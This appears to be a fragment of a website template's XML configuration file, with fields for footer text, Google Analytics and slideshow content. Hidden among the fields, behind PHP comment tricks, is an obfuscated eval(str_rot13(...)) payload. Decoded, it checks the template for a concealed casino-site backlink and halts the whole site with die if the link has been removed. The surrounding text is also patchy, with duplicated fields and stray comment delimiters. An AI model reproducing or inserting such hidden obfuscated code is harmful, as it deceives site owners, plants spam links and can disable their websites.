...
<config>
  ...
  <field name="footertext" type="textarea" default="Custom text here" label="Custom text here" description="Custom text here" rows="1" cols="60"/> <field name="analyticsdisable" type="radio" default="1" label="Google analytics"><option value="0">Disable</option><option value="1">Enable</option></field> TEMPLATE NUMBER ECHO */ eval(str_rot13('shapgvba wz_frphevgl(){$y=\'<n uers="uggcf://jjj.zrtnzbbynufcvryra.pbz/" bapyvpx="erghea snyfr" pynff="qvfnoyr" >ZrtnZbbynuFcvryra</n>\';$s= qveanzr(qveanzr(qveanzr(__SVYR__))) . "/grzcyngr.cuc";;$sq=sbcra($s,\'e\');$p=sernq($sq,svyrfvmr($s));spybfr($sq);vs(fgecbf($p, $y)==0){rpub \'<u2>Guvf grzcyngr jnf eryrnfrq haqre gur perngvir pbzzbaf nggevohgvba 4.0 yvprafr. Lbh pna hfr/zbqvsl vg, ohg gur nhgube yvax zhfg erznva vagnpg. Haqb lbhe ynfg npgvba be vafgnyy gur grzcyngr ntnva gb erzbir guvf zrffntr.</u2>\';qvr;}}wz_frphevgl();')); /* 
  <field name="googleanalytics" type="textarea" default="UA-1111111-22" label="Google analytics UA code only (replace the code below)" description="Paste your google analytics UA code only. Not the whole script. Example: UA-1111111-22." rows="1" cols="40"/>	   	
   ...
   <field name="slidedesc9" type="textarea" filter="safehtml" default="Description slide 6" label="Description slide 6" description="Slideshow content 6" rows="1" cols="60" /><field name="googleanalytics" type="textarea" default="UA-1111111-22" label="Google analytics UA code only (replace the code below)" description="Paste your google analytics UA code only. Not the whole script. Example: UA-1111111-22." rows="1" cols="40"/> */   /*
